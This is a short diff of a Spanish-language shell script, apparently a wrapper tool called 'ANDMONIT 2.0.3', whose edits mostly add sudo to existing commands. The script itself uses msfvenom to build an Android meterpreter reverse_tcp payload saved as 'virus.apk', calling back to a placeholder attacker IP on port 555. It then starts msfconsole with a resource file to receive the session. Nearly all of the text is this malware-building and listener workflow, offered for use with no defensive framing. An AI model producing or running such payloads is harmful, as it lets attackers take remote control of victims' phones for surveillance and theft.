@@ -1,4 +1,4 @@
-clear
+sudo clear
 figlet ANDMONIT 2.0.3
 echo INICIANDO SERVICIOS:
 echo 	[!] INICIANDO ANDMONIT...
@@ -23,9 +23,9 @@ clear
 figlet ANDMONIT 2.0.3
 echo [!]CREANDO APK...
 cd metasploit-framework
-msfvenom -p android/meterpreter/reverse_tcp LHOST=TU_IP LPORT=555 R > virus.apk
+sudo ./msfvenom -p android/meterpreter/reverse_tcp LHOST=TU_IP LPORT=555 R > virus.apk
 echo APK CREADA CON EXITO!
 echo [!]MONITOREANDO APK...
-./msfconsole -r android-otro.rc
+sudo ./msfconsole -r android-otro.rc
 clear
 echo [!]SESION DE ANDMONIT FINALIZADA
